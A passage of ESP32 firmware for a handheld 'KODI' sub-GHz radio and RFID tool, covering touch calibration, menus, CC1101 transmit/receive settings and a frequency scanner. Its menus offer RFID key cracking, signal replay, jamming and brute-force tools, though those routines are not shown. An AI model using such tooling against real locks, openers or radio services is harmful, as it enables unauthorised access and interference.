  int tw = strlen(label) * 6;
  tft.setCursor(x + (w - tw) / 2, y + (h - 8) / 2);
  tft.print(label);
}

bool inBtn(int tx, int ty, int bx, int by, int bw, int bh) {
  return tx >= bx && tx < bx+bw && ty >= by && ty < by+bh;
}

const char* modName(int m) {
  switch(m) { case 0: return "ASK"; case 1: return "2FSK"; case 2: return "GFSK"; case 3: return "MSK"; }
  return "?";
}
const char* rateName(int r) {
  switch(r) { case 0: return "1.2k"; case 1: return "2.4k"; case 2: return "10k"; case 3: return "38k"; case 4: return "100k"; case 5: return "250k"; }
  return "?";
}
const char* pwrName(int p) {
  const char* n[] = {"-30","-20","-15","-10","0","+5","+7","+10"};
  return (p >= 0 && p <= 7) ? n[p] : "?";
}

// ═══════════════════════════════════════════════════════════
//  SCREEN: BOOT
// ═══════════════════════════════════════════════════════════

void drawBoot() {
  tft.fillScreen(C_BG);

  tft.drawFastHLine(10, 10, 25, C_DGREEN);
  tft.drawFastVLine(10, 10, 25, C_DGREEN);
  tft.drawFastHLine(285, 10, 25, C_DGREEN);
  tft.drawFastVLine(309, 10, 25, C_DGREEN);
  tft.drawFastHLine(10, 469, 25, C_DGREEN);
  tft.drawFastVLine(10, 445, 25, C_DGREEN);
  tft.drawFastHLine(285, 469, 25, C_DGREEN);
  tft.drawFastVLine(309, 445, 25, C_DGREEN);

  tft.drawFastHLine(40, 165, 240, C_DGREEN);

  tft.setTextColor(C_CYAN);
  tft.setTextSize(4);
  tft.setCursor(125, 180);
  tft.print("KODI");

  tft.drawFastHLine(40, 220, 240, C_DGREEN);

  tft.setTextSize(1);
  tft.setTextColor(C_CYAN);
  tft.setCursor(124, 235);
  tft.print("DEVKIT  v1.0");

  delay(2000);
}

// ═══════════════════════════════════════════════════════════
//  SCREEN: CALIBRATION (12-point grid, median-filtered, SD-backed)
// ═══════════════════════════════════════════════════════════

void drawCross(int x, int y, uint16_t color) {
  tft.drawLine(x - 12, y, x + 12, y, color);
  tft.drawLine(x, y - 12, x, y + 12, color);
  tft.drawCircle(x, y, 6, color);
}

uint16_t medianOfArr(uint16_t* a, int n) {
  for (int i = 1; i < n; i++) {
    uint16_t k = a[i];
    int j = i - 1;
    while (j >= 0 && a[j] > k) { a[j+1] = a[j]; j--; }
    a[j+1] = k;
  }
  return a[n / 2];
}

bool loadCalFromSd() {
  if (!sdOk) return false;
  File f = SD.open("/kodi/touch_cal.bin", FILE_READ);
  if (!f || f.size() != 10) { if (f) f.close(); return false; }
  uint16_t data[5];
  f.read((uint8_t*)data, 10);
  f.close();
  if (data[0] > 4095 || data[1] > 4095 || data[2] > 4095 || data[3] > 4095) return false;
  if (data[4] > 7) return false;
  if (data[0] >= data[1] || data[2] >= data[3]) return false;
  memcpy(calData, data, 10);
  tft.setTouch(calData);
  return true;
}

void saveCalToSd() {
  if (!sdOk) return;
  if (!SD.exists("/kodi")) SD.mkdir("/kodi");
  File f = SD.open("/kodi/touch_cal.bin", FILE_WRITE);
  if (f) { f.write((uint8_t*)calData, 10); f.close(); }
}

void doCalibration() {
  const int COLS = 3, ROWS = 4, NPTS = 12;
  const int MX = 40, MY = 50;
  const int SAMP = 32;

  int16_t scrX[NPTS], scrY[NPTS];
  uint16_t rawX[NPTS], rawY[NPTS];

  for (int r = 0; r < ROWS; r++) {
    for (int c = 0; c < COLS; c++) {
      int i = r * COLS + c;
      scrX[i] = MX + c * (320 - 2 * MX) / (COLS - 1);
      scrY[i] = MY + r * (480 - 2 * MY) / (ROWS - 1);
    }
  }

  for (int attempt = 0; attempt < 2; attempt++) {
    tft.fillScreen(C_BG);
    tft.setTextColor(C_GREEN);
    tft.setTextSize(2);
    tft.setCursor(20, 190);
    tft.print("Touch Calibration");
    tft.setTextSize(1);
    tft.setCursor(20, 220);
    tft.print("Tap each crosshair precisely.");
    tft.setCursor(20, 235);
    tft.printf("%d points - hold steady.", NPTS);
    if (attempt > 0) {
      tft.setTextColor(C_ORANGE, C_BG);
      tft.setCursor(20, 260);
      tft.print("Retry - tap more carefully.");
    }
    delay(2000);

    for (int i = 0; i < NPTS; i++) {
      tft.fillScreen(C_BG);
      drawCross(scrX[i], scrY[i], C_GREEN);
      tft.setTextColor(C_DGREEN, C_BG);
      tft.setTextSize(1);
      int textY = (scrY[i] < 240) ? 420 : 40;
      tft.setCursor(90, textY);
      tft.printf("Point %d of %d", i + 1, NPTS);

      uint16_t tx, ty;
      do { tft.getTouchRaw(&tx, &ty); delay(10); }
      while (tx > 100 && tx < 4000 && ty > 100 && ty < 4000);
      delay(200);

      do { tft.getTouchRaw(&tx, &ty); delay(10); }
      while (!(tx > 100 && tx < 4000 && ty > 100 && ty < 4000));

      uint16_t sampX[SAMP], sampY[SAMP];
      int n = 0;
      for (int s = 0; s < SAMP + 8 && n < SAMP; s++) {
        delay(10);
        tft.getTouchRaw(&tx, &ty);
        if (tx > 100 && tx < 4000 && ty > 100 && ty < 4000) {
          sampX[n] = tx; sampY[n] = ty; n++;
        }
      }
      rawX[i] = n > 0 ? medianOfArr(sampX, n) : tx;
      rawY[i] = n > 0 ? medianOfArr(sampY, n) : ty;

      do { tft.getTouchRaw(&tx, &ty); delay(10); }
      while (tx > 100 && tx < 4000 && ty > 100 && ty < 4000);

      drawCross(scrX[i], scrY[i], C_CYAN);
      toneBeep(2000, 30);
      delay(200);
    }

    float mRX = 0, mSX = 0, mSY = 0;
    for (int i = 0; i < NPTS; i++) { mRX += rawX[i]; mSX += scrX[i]; mSY += scrY[i]; }
    mRX /= NPTS; mSX /= NPTS; mSY /= NPTS;

    float corrXX = 0, corrXY = 0;
    for (int i = 0; i < NPTS; i++) {
      corrXX += (rawX[i] - mRX) * (scrX[i] - mSX);
      corrXY += (rawX[i] - mRX) * (scrY[i] - mSY);
    }

    uint8_t flags = 0;
    float absXX = corrXX > 0 ? corrXX : -corrXX;
    float absXY = corrXY > 0 ? corrXY : -corrXY;
    if (absXY > absXX) {
      flags |= 1;
      for (int i = 0; i < NPTS; i++) { uint16_t t = rawX[i]; rawX[i] = rawY[i]; rawY[i] = t; }
    }

    float sSX = 0, sRX = 0, sSXRX = 0, sSX2 = 0;
    float sSY = 0, sRY = 0, sSYRY = 0, sSY2 = 0;
    for (int i = 0; i < NPTS; i++) {
      sSX += scrX[i]; sRX += rawX[i]; sSXRX += (float)scrX[i] * rawX[i]; sSX2 += (float)scrX[i] * scrX[i];
      sSY += scrY[i]; sRY += rawY[i]; sSYRY += (float)scrY[i] * rawY[i]; sSY2 += (float)scrY[i] * scrY[i];
    }
    float dX = NPTS * sSX2 - sSX * sSX;
    float aX = (NPTS * sSXRX - sSX * sRX) / dX;
    float bX = (sRX - aX * sSX) / NPTS;
    float dY = NPTS * sSY2 - sSY * sSY;
    float aY = (NPTS * sSYRY - sSY * sRY) / dY;
    float bY = (sRY - aY * sSY) / NPTS;

    float rawAtX0 = bX;
    float rawAtX320 = aX * 320.0f + bX;
    if (rawAtX0 > rawAtX320) {
      flags |= 2;
      rawAtX0 = 4095.0f - rawAtX0;
      rawAtX320 = 4095.0f - rawAtX320;
    }

    float rawAtY0 = bY;
    float rawAtY480 = aY * 480.0f + bY;
    if (rawAtY0 > rawAtY480) {
      flags |= 4;
      rawAtY0 = 4095.0f - rawAtY0;
      rawAtY480 = 4095.0f - rawAtY480;
    }

    calData[0] = (uint16_t)constrain((int32_t)rawAtX0, 0, 4095);
    calData[1] = (uint16_t)constrain((int32_t)rawAtX320, 0, 4095);
    calData[2] = (uint16_t)constrain((int32_t)rawAtY0, 0, 4095);
    calData[3] = (uint16_t)constrain((int32_t)rawAtY480, 0, 4095);
    calData[4] = flags;
    tft.setTouch(calData);

    tft.fillScreen(C_BG);
    drawCross(160, 240, C_CYAN);
    tft.setTextColor(C_GREEN, C_BG);
    tft.setTextSize(1);
    tft.setCursor(50, 410);
    tft.print("Tap the crosshair to verify");

    uint16_t vx, vy;
    do { tft.getTouchRaw(&vx, &vy); delay(10); }
    while (vx > 100 && vx < 4000 && vy > 100 && vy < 4000);
    delay(300);
    while (!tft.getTouch(&vx, &vy)) delay(10);
    uint16_t tmpA, tmpB;
    do { tft.getTouchRaw(&tmpA, &tmpB); delay(10); }
    while (tmpA > 100 && tmpA < 4000 && tmpB > 100 && tmpB < 4000);

    int errX = abs((int)vx - 160);
    int errY = abs((int)vy - 240);

    if (errX <= 30 && errY <= 30) {
      saveCalToSd();
      tft.fillScreen(C_BG);
      tft.setTextColor(C_GREEN, C_BG);
      tft.setTextSize(2);
      tft.setCursor(40, 210);
      tft.print("Calibrated!");
      tft.setTextSize(1);
      tft.setCursor(40, 240);
      if (sdOk) tft.print("Saved to SD card");
      else tft.print("(No SD - not saved)");
      delay(800);
      return;
    }

    if (attempt == 0) {
      tft.fillScreen(C_BG);
      tft.setTextColor(C_RED, C_BG);
      tft.setTextSize(2);
      tft.setCursor(40, 200);
      tft.printf("Off by %d,%d px", errX, errY);
      tft.setTextSize(1);
      tft.setCursor(40, 235);
      tft.print("Retrying calibration...");
      delay(1500);
    }
  }

  saveCalToSd();
  tft.fillScreen(C_BG);
  tft.setTextColor(C_ORANGE, C_BG);
  tft.setTextSize(2);
  tft.setCursor(20, 200);
  tft.print("Calibrated (rough)");
  tft.setTextSize(1);
  tft.setCursor(20, 235);
  tft.print("Use RE-CALIB in Settings to redo");
  delay(1200);
}

// ═══════════════════════════════════════════════════════════
//  SCREEN: HOME
// ═══════════════════════════════════════════════════════════

void drawHome() {
  sdUpdateFree();
  tft.fillScreen(C_BG);
  drawHeader("KODI");

  drawBtn(10,  55, 145, 52, "RFID",     C_LGRAY, C_BG);
  drawBtn(165, 55, 145, 52, "CC1101-A", C_LGRAY, C_BG);

  drawBtn(10, 115, 145, 52, "CC1101-B", C_LGRAY, C_BG);
  drawBtn(165,115, 145, 52, "Sub-GHz",  C_LGRAY, C_BG);

  drawBtn(10, 175, 145, 52, "WiFi",     C_LGRAY, C_BG);
  drawBtn(165,175, 145, 52, "Opener",   C_LGRAY, C_BG);

  drawBtn(10, 235, 145, 52, "Saved",    C_LGRAY, C_BG);
  drawBtn(165,235, 145, 52, "Settings", C_LGRAY, C_BG);

  drawBtn(10, 295, 300, 42, "Neural Report", C_LGRAY, C_BG);

  drawFooter(node0Ok ? "KODI | Node 0: connected" : "KODI | Node 0: OFFLINE");

  tft.drawFastHLine(10, 345, 300, C_DGREEN);
  tft.setTextSize(1);
  tft.setTextColor(C_CYAN, C_BG);
  tft.setCursor(10, 352);
  tft.printf("PN532:%s  CCA:%s  CCB:%s  SD:%s",
    pn532Ok?"OK":"--", cc1101aOk?"OK":"--", cc1101bOk?"OK":"--", sdOk?"OK":"--");
  tft.setCursor(10, 367);
  tft.printf("Freq:%.2f MHz  Mod:%s  Pwr:%s dBm", ccFreq, modName(ccMod), pwrName(ccPower));
}

void handleHome(int tx, int ty) {
  if (inBtn(tx,ty, 10,55, 145,52))       { clickOk(); curScreen = SCR_RFID; needRedraw = true; }
  else if (inBtn(tx,ty, 165,55, 145,52)) { clickOk(); activeRadio = 'A'; curScreen = SCR_CC_TX; needRedraw = true; }
  else if (inBtn(tx,ty, 10,115,145,52))  { clickOk(); activeRadio = 'B'; curScreen = SCR_CC_TX; needRedraw = true; }
  else if (inBtn(tx,ty, 165,115,145,52)) { clickOk(); curScreen = SCR_SUBGHZ; needRedraw = true; }
  else if (inBtn(tx,ty, 10,175,145,52))  { clickOk(); curScreen = SCR_WIFI; needRedraw = true; }
  else if (inBtn(tx,ty, 165,175,145,52)) { clickOk(); curScreen = SCR_OPENER_PICK; needRedraw = true; }
  else if (inBtn(tx,ty, 10,235,145,52))  { clickOk(); fileScroll = 0; savedNeedLoad = true; wifiViewActive = false; neuralViewActive = false; curScreen = SCR_SAVED; needRedraw = true; }
  else if (inBtn(tx,ty, 165,235,145,52)) { clickOk(); curScreen = SCR_SETTINGS; needRedraw = true; }
  else if (inBtn(tx,ty, 10,295,300,42))  { clickOk(); nnRptScroll = 0; curScreen = SCR_NEURAL; needRedraw = true; }
}

// ═══════════════════════════════════════════════════════════
//  SCREEN: RFID
// ═══════════════════════════════════════════════════════════

void drawRfid() {
  tft.fillScreen(C_BG);
  drawHeader("RFID Scanner");

  tft.setTextSize(2);
  tft.setTextColor(C_CYAN, C_BG);
  tft.setCursor(30, 56);
  tft.print("Last UID:");

  tft.setTextColor(C_CYAN, C_BG);
  tft.setCursor(30, 80);
  if (rfidUidLen > 0) {
    tft.setTextSize(rfidUidLen > 4 ? 2 : 3);
    for (int i = 0; i < rfidUidLen * 2; i += 2) {
      if (i > 0) tft.print(":");
      tft.print(rfidUid[i]); tft.print(rfidUid[i+1]);
    }
  } else {
    tft.setTextSize(3);
    tft.print("-- none --");
  }

  drawBtn(10, 140, 145, 55, "SCAN", C_LGRAY, C_BG);
  drawBtn(165, 140, 145, 55, "SAVE", C_LGRAY, C_BG);
  drawBtn(10, 210, 145, 55, "LOOP", C_LGRAY, C_BG);
  drawBtn(165, 210, 145, 55, "STOP", C_LGRAY, C_BG);
  drawBtn(10, 280, 300, 50, "AUTO CRACK", C_LGRAY, C_BG);

  drawFooter("SCAN=single | LOOP=continuous | CRACK=brute keys");
}

void handleRfid(int tx, int ty) {
  if (inBtn(tx,ty, 200,0, 120,54)) { sendAndWait("RFID_STOP"); clickBack(); curScreen = SCR_HOME; needRedraw = true; return; }
  if (inBtn(tx,ty, 10,140, 145,55)) {
    clickOk();
    tft.fillRect(10, 121, 300, 20, C_BG);
    tft.setTextSize(2); tft.setTextColor(C_ORANGE, C_BG);
    tft.setCursor(10, 125); tft.print("Scanning...");
    ledBlue();

    if (oledOk) {
      oled.clearDisplay(); oled.setTextColor(SSD1306_WHITE);
      oled.setTextSize(1);
      oled.setCursor(0, 0); oled.print(F("RFID SCANNING"));
      oled.drawLine(0, 9, 127, 9, SSD1306_WHITE);
      oled.setCursor(0, 20); oled.print(F("Hold card near"));
      oled.setCursor(0, 32); oled.print(F("reader..."));
      oled.setCursor(0, 50); oled.print(F("BOOT to cancel"));
      oled.display();
    }

    bool found = false;
    while (true) {
      if (digitalRead(0) == LOW) {
        delay(80);
        if (digitalRead(0) == LOW) {
          while (digitalRead(0) == LOW) delay(10);
          break;
        }
      }
      sendCmd("RFID");
      if (waitReply(800) && strncmp(rspBuf, "RF,", 3) == 0) {
        int len = atoi(rspBuf + 3);
        if (len > 0) {
          const char* hex = strchr(rspBuf + 3, ',');
          if (hex) {
            rfidUidLen = len;
            strncpy(rfidUid, hex+1, sizeof(rfidUid)-1);
            found = true;
            break;
          }
        }
      }
      delay(150);
    }

    ledOff();
    if (found) {
      tft.fillRect(10, 121, 300, 20, C_BG);
      tft.setTextColor(C_GREEN, C_BG);
      tft.setCursor(10, 125); tft.print("Card found!");
      ledFlash(ledGreen, 2, 100, 80);
      toneBeep(2000, 50);
      delay(400);
      kbInput[0] = '\0'; kbInputLen = 0;
      kbShift = false; kbPage = 0;
      kbSaveType = 0;
      kbReturnScreen = SCR_RFID;
      curScreen = SCR_KEYBOARD;
    }
    needRedraw = true;
    return;
  }
  else if (inBtn(tx,ty, 165,140, 145,55)) {
    if (rfidUidLen > 0) {
      clickOk();
      kbInput[0] = '\0'; kbInputLen = 0;
      kbShift = false; kbPage = 0;
      kbSaveType = 0;
      kbReturnScreen = SCR_RFID;
      curScreen = SCR_KEYBOARD;
      needRedraw = true;
      return;
    } else {
      drawFooter("Nothing to save — scan first");
    }
  }
  else if (inBtn(tx,ty, 10,210, 145,55))  { clickOk(); sendAndWait("RFID_LOOP"); ledBlue(); drawFooter("Loop active"); }
  else if (inBtn(tx,ty, 165,210, 145,55)) { clickOk(); sendAndWait("RFID_STOP"); ledOff(); drawFooter("Loop stopped"); }
  else if (inBtn(tx,ty, 10,280, 300,50))  { clickOk(); prevScreen = SCR_RFID; curScreen = SCR_RFID_CRACK; needRedraw = true; }
}

// ═══════════════════════════════════════════════════════════
//  SCREEN: CC1101 TX/RX CONFIG
// ═══════════════════════════════════════════════════════════

void drawCcTx() {
  tft.fillScreen(C_BG);
  char title[24];
  snprintf(title, sizeof(title), "CC1101-%c Config", activeRadio);
  drawHeader(title);

  int y = 55;
  int lx = 10, vx = 140;
  tft.setTextSize(2);

  tft.setTextColor(C_CYAN, C_BG); tft.setCursor(lx, y); tft.print("Freq MHz:");
  tft.setTextColor(C_CYAN, C_BG); tft.setCursor(vx, y); tft.printf("%.2f", ccFreq);
  drawBtn(230, y-3, 38, 34, "-", C_LGRAY, C_BG); drawBtn(272, y-3, 38, 34, "+", C_LGRAY, C_BG);
  y += 45;

  tft.setTextColor(C_CYAN, C_BG); tft.setCursor(lx, y); tft.print("Mod:");
  tft.setTextColor(C_CYAN, C_BG); tft.setCursor(vx, y); tft.print(modName(ccMod));
  drawBtn(230, y-3, 80, 34, "CYCLE", C_LGRAY, C_BG);
  y += 45;

  tft.setTextColor(C_CYAN, C_BG); tft.setCursor(lx, y); tft.print("Rate:");
  tft.setTextColor(C_CYAN, C_BG); tft.setCursor(vx, y); tft.print(rateName(ccRate));
  drawBtn(230, y-3, 80, 34, "CYCLE", C_LGRAY, C_BG);
  y += 45;

  tft.setTextColor(C_CYAN, C_BG); tft.setCursor(lx, y); tft.print("Power:");
  tft.setTextColor(C_CYAN, C_BG); tft.setCursor(vx, y); tft.printf("%s dBm", pwrName(ccPower));
  drawBtn(230, y-3, 38, 34, "-", C_LGRAY, C_BG); drawBtn(272, y-3, 38, 34, "+", C_LGRAY, C_BG);
  y += 45;

  tft.setTextColor(C_CYAN, C_BG); tft.setCursor(lx, y); tft.print("Len:");
  tft.setTextColor(C_CYAN, C_BG); tft.setCursor(vx, y); tft.printf("%d bytes", ccPktLen);
  y += 45;

  tft.setTextColor(C_CYAN, C_BG); tft.setCursor(lx, y); tft.print("Data:");
  tft.setTextColor(C_CYAN, C_BG); tft.setCursor(vx - 25, y);
  for (int i = 0; i < min((int)ccPktLen, 10); i++) tft.printf("%02X", ccPayload[i]);
  if (ccPktLen > 10) tft.print("..");
  y += 45;

  tft.setTextColor(C_CYAN, C_BG); tft.setCursor(lx, y); tft.print("Burst:");
  tft.setTextColor(C_CYAN, C_BG); tft.setCursor(vx, y); tft.printf("%dx %dms", ccBurstCount, ccBurstGap);

  drawBtn(10, 400, 96, 50, "SEND", C_LGRAY, C_BG);
  drawBtn(112, 400, 96, 50, "RECEIVE", C_LGRAY, C_BG);
  drawBtn(214, 400, 96, 50, "SAVE", C_LGRAY, C_BG);
}

void handleCcTx(int tx, int ty) {
  if (inBtn(tx,ty, 200,0, 120,54)) { clickBack(); curScreen = SCR_HOME; needRedraw = true; return; }

  int y = 52;
  if (inBtn(tx,ty, 230,y, 38,34)) { ccFreq -= 0.01f; if (ccFreq < 300) ccFreq = 300; clickNav(); needRedraw = true; }
  if (inBtn(tx,ty, 272,y, 38,34)) { ccFreq += 0.01f; if (ccFreq > 928) ccFreq = 928; clickNav(); needRedraw = true; }
  y += 45;
  if (inBtn(tx,ty, 230,y, 80,34)) { ccMod = (ccMod + 1) % 4; clickNav(); needRedraw = true; }
  y += 45;
  if (inBtn(tx,ty, 230,y, 80,34)) { ccRate = (ccRate + 1) % 6; clickNav(); needRedraw = true; }
  y += 45;
  if (inBtn(tx,ty, 230,y, 38,34)) { if (ccPower > 0) ccPower--; clickNav(); needRedraw = true; }
  if (inBtn(tx,ty, 272,y, 38,34)) { if (ccPower < 7) ccPower++; clickNav(); needRedraw = true; }

  if (inBtn(tx,ty, 10,400, 96,50)) {
    clickOk();
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "CC_INIT,%c,%.2f,%d,%d,%d,%d,%02X,%02X",
      activeRadio, ccFreq, ccMod, ccRate, ccPower, ccPktLen, ccSync1, ccSync0);
    sendAndWait(cmd);

    char hex[123] = "";
    for (int i = 0; i < ccPktLen; i++) sprintf(hex + i*2, "%02X", ccPayload[i]);
    snprintf(cmd, sizeof(cmd), "CC_TX,%c,%s,%d,%d", activeRadio, hex, ccBurstCount, ccBurstGap);
    drawFooter("Transmitting...");
    ledGreen();
    sendAndWait(cmd, 10000);
    ledFlash(ledGreen, 2, 80, 80);
    if (rspReady) {
      char msg[64];
      snprintf(msg, sizeof(msg), "TX done: %s", rspBuf);
      drawFooter(msg);
    }
  }
  // RECEIVE
  if (inBtn(tx,ty, 112,400, 96,50)) {
    clickOk();
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "CC_INIT,%c,%.2f,%d,%d,%d,%d,%02X,%02X",
      activeRadio, ccFreq, ccMod, ccRate, ccPower, ccPktLen, ccSync1, ccSync0);
    sendAndWait(cmd);
    snprintf(cmd, sizeof(cmd), "CC_RX,%c", activeRadio);
    sendAndWait(cmd);
    tft.fillRect(0, 350, 320, 100, C_BG);
    tft.setTextSize(2);
    tft.setTextColor(C_RED, C_BG);
    tft.setCursor(22, 375);
    tft.print("Press BOOT to stop");
    tft.setTextSize(1);
    tft.setTextColor(C_CYAN, C_BG);
    tft.setCursor(22, 400);
    tft.print("RX active - listening...");

    int oRxHpos = 0;
    const int oRxGx = 0, oRxGy = 24, oRxGw = 128, oRxGh = 40;
    if (oledOk) {
      oled.clearDisplay(); oled.setTextColor(SSD1306_WHITE);
      oled.setTextSize(1);
      oled.setCursor(0, 0); oled.printf("CC1101-%c RX", activeRadio);
      oled.drawLine(0, 9, 127, 9, SSD1306_WHITE);
      oled.setCursor(0, 12); oled.printf("%.2f MHz", ccFreq);
      oled.drawRect(oRxGx, oRxGy, oRxGw, oRxGh, SSD1306_WHITE);
      oled.display();
    }

    while (true) {
      if (digitalRead(0) == LOW) {
        delay(80);
        if (digitalRead(0) == LOW) {
          while (digitalRead(0) == LOW) delay(10);
          break;
        }
      }
      char poll[16]; snprintf(poll, sizeof(poll), "CC_RXPOLL,%c", activeRadio);
      sendAndWait(poll, 500);
      if (rspReady && strncmp(rspBuf, "RD,", 3) == 0 && rspBuf[3] != '0') {
        tft.fillRect(0, 395, 320, 20, C_BG);
        tft.setTextSize(1);
        tft.setTextColor(C_CYAN, C_BG);
        tft.setCursor(22, 400);
        char msg[128]; snprintf(msg, sizeof(msg), "RX: %s", rspBuf);
        tft.print(msg);
        break;
      }
      if (oledOk) {
        char rssiCmd[16]; snprintf(rssiCmd, sizeof(rssiCmd), "CC_RSSI,%c", activeRadio);
        sendAndWait(rssiCmd, 500);
        if (rspReady && strncmp(rspBuf, "RS,", 3) == 0) {
          int8_t rssi = atoi(rspBuf + 3);
          int oBarH = map(constrain(rssi, -110, -30), -110, -30, 0, oRxGh - 2);
          int oPx = oRxGx + 1 + (oRxHpos % (oRxGw - 2));
          oled.drawLine(oPx, oRxGy + 1, oPx, oRxGy + oRxGh - 2, SSD1306_BLACK);
          oled.drawLine(oPx, oRxGy + oRxGh - 1 - oBarH, oPx, oRxGy + oRxGh - 2, SSD1306_WHITE);
          oRxHpos++;
          if (oRxHpos >= oRxGw - 2) oRxHpos = 0;
          oled.display();
        }
      }
      delay(50);
    }
    char stop[16]; snprintf(stop, sizeof(stop), "CC_RXSTOP,%c", activeRadio);
    sendAndWait(stop);
    needRedraw = true;
  }
  // SAVE
  if (inBtn(tx,ty, 214,400, 96,50)) { clickOk(); sdSaveCcProfile(); drawFooter("Profile saved to SD!"); }
}

// ═══════════════════════════════════════════════════════════
//  SCREEN: SUB-GHZ TOOLS MENU
// ═══════════════════════════════════════════════════════════

void drawSubGhz() {
  tft.fillScreen(C_BG);
  drawHeader("Sub-GHz Tools");

  drawBtn(10, 55,  145, 52, "Freq Scan",  C_LGRAY, C_BG);
  drawBtn(165, 55, 145, 52, "RSSI Mon",   C_LGRAY, C_BG);
  drawBtn(10, 115, 145, 52, "Record",     C_LGRAY, C_BG);
  drawBtn(165,115, 145, 52, "Replay",     C_LGRAY, C_BG);
  drawBtn(10, 175, 145, 52, "Jammer",     C_LGRAY, C_BG);
  drawBtn(165,175, 145, 52, "Brute Force",C_LGRAY, C_BG);
  drawBtn(10, 235, 145, 52, "Signal Gen", C_LGRAY, C_BG);
  drawBtn(165,235, 145, 52, "Auto-Scan",  C_LGRAY, C_BG);
  drawBtn(10, 295, 300, 52, "OPENER",     C_LGRAY, C_BG);

  drawFooter("Select a sub-GHz tool");
}

void handleSubGhz(int tx, int ty) {
  if (inBtn(tx,ty, 200,0, 120,54))  { clickBack(); curScreen = SCR_HOME; needRedraw = true; return; }
  if (inBtn(tx,ty, 10,55, 145,52)) { clickOk(); curScreen = SCR_SCAN; needRedraw = true; }
  if (inBtn(tx,ty, 165,55,145,52)) { clickOk(); curScreen = SCR_RSSI_MON; needRedraw = true; }
  if (inBtn(tx,ty, 10,115,145,52)) { clickOk(); curScreen = SCR_RECORD; needRedraw = true; }
  if (inBtn(tx,ty, 165,115,145,52)){ clickOk(); curScreen = SCR_REPLAY; needRedraw = true; }
  if (inBtn(tx,ty, 10,175,145,52)) { clickOk(); curScreen = SCR_JAM; needRedraw = true; }
  if (inBtn(tx,ty, 165,175,145,52)){ clickOk(); curScreen = SCR_BRUTE; needRedraw = true; }
  if (inBtn(tx,ty, 10,235,145,52)) { clickOk(); curScreen = SCR_CW; needRedraw = true; }
  if (inBtn(tx,ty, 165,235,145,52)){ clickOk(); curScreen = SCR_CC_AUTOSCAN; needRedraw = true; }
  if (inBtn(tx,ty, 10,295,300,52)) { clickOk(); prevScreen = SCR_SUBGHZ; openerState = 0; curScreen = SCR_OPENER; needRedraw = true; }
}

// ═══════════════════════════════════════════════════════════
//  SCREEN: FREQUENCY SCANNER
// ═══════════════════════════════════════════════════════════

void drawScan() {
  tft.fillScreen(C_BG);
  drawHeader("Freq Scanner");

  tft.setTextSize(1);
  tft.setTextColor(C_CYAN, C_BG);
  tft.setCursor(20, 55);
  tft.printf("Range: %.2f - %.2f MHz  Steps: %d", scanStart, scanEnd, scanSteps);

  if (scanDone) {
    int gx = 10, gy = 70, gw = 300, gh = 160;
    tft.drawRect(gx-1, gy-1, gw+2, gh+2, C_DGREEN);

    for (int i = 0; i < scanSteps && i < 128; i++) {
      int x = gx + (i * gw) / scanSteps;
      int barH = map(constrain(scanData[i], -110, -30), -110, -30, 0, gh);
      uint16_t col = (scanData[i] > -50) ? C_RED : (scanData[i] > -70) ? C_ORANGE : C_GREEN;
      tft.fillRect(x, gy + gh - barH, max(gw/scanSteps - 1, 1), barH, col);
    }

    tft.setCursor(gx, gy + gh + 5);
    tft.printf("%.1f", scanStart);
    tft.setCursor(gx + gw - 30, gy + gh + 5);
    tft.printf("%.1f", scanEnd);
  }

  drawBtn(10,  252, 56, 38, "300", C_LGRAY, C_BG);
  drawBtn(71,  252, 56, 38, "390", C_LGRAY, C_BG);
  drawBtn(132, 252, 56, 38, "433", C_LGRAY, C_BG);
  drawBtn(193, 252, 56, 38, "868", C_LGRAY, C_BG);
  drawBtn(254, 252, 56, 38, "915", C_LGRAY, C_BG);

  drawBtn(10,  296, 72, 40, "<<10", C_LGRAY, C_BG);
  drawBtn(86,  296, 72, 40, "<<",   C_LGRAY, C_BG);
  drawBtn(162, 296, 72, 40, ">>",   C_LGRAY, C_BG);
  drawBtn(238, 296, 72, 40, ">>10", C_LGRAY, C_BG);

  drawBtn(10, 342, 300, 45, "SCAN", C_LGRAY, C_BG);
  drawBtn(10, 392, 300, 45, "WIDER", C_LGRAY, C_BG);
}

void runFreqScan() {
  tft.fillScreen(C_BG);
  drawHeader("Freq Scanner");
  tft.setTextSize(1);
  tft.setTextColor(C_CYAN, C_BG);
  tft.setCursor(20, 55);
  tft.printf("Scanning: %.2f - %.2f MHz", scanStart, scanEnd);

  int gx = 10, gy = 70, gw = 300, gh = 200;
  tft.drawRect(gx-1, gy-1, gw+2, gh+2, C_DGREEN);
  tft.setCursor(gx, gy + gh + 5);
  tft.printf("%.1f", scanStart);
  tft.setCursor(gx + gw - 30, gy + gh + 5);
  tft.printf("%.1f", scanEnd);

  drawBtn(10, 300, 300, 45, "STOP", C_LGRAY, C_BG);

  if (oledOk) {
    oled.clearDisplay(); oled.setTextColor(SSD1306_WHITE);
    oled.setTextSize(1);
    oled.setCursor(0, 0); oled.print(F("FREQ SCANNING"));
    oled.drawLine(0, 9, 127, 9, SSD1306_WHITE);
    oled.setCursor(0, 20); oled.printf("%.1f-%.1f MHz", scanStart, scanEnd);
    oled.display();
  }

  while (true) {
    if (digitalRead(0) == LOW) {
      delay(80);
      if (digitalRead(0) == LOW) {
        while (digitalRead(0) == LOW) delay(10);
        break;
      }
    }
    uint16_t sx, sy;
    if (tft.getTouch(&sx, &sy) && inBtn(sx, sy, 10, 300, 300, 45)) break;

    char cmd[64];
    snprintf(cmd, sizeof(cmd), "CC_SCAN,%.2f,%.2f,%d", scanStart, scanEnd, scanSteps);
    sendAndWait(cmd, 15000);
    if (rspReady && strncmp(rspBuf, "SC,", 3) == 0) {
      char* p = rspBuf + 3;
      int steps = atoi(p);
      tft.fillRect(gx, gy, gw, gh, C_BG);

      int8_t bestRssi = -127;
      int bestIdx = 0;
      for (int i = 0; i < steps && i < 128; i++) {
        p = strchr(p, ',');
        if (!p) break;
        p++;
        scanData[i] = atoi(p);
        int x = gx + (i * gw) / steps;
        int barH = map(constrain(scanData[i], -110, -30), -110, -30, 0, gh);
        uint16_t col = (scanData[i] > -50) ? C_RED : (scanData[i] > -70) ? C_ORANGE : C_GREEN;
        tft.fillRect(x, gy + gh - barH, max(gw/steps - 1, 1), barH, col);
        if (scanData[i] > bestRssi) { bestRssi = scanData[i]; bestIdx = i; }
      }
      scanSteps = steps;
      scanDone = true;

      if (oledOk) {
        oled.fillRect(0, 30, 128, 34, SSD1306_BLACK);
        if (bestRssi > -80) {
          float step = (scanEnd - scanStart) / max(steps - 1, 1);
          oled.setCursor(0, 32); oled.printf("Peak: %ddBm", bestRssi);
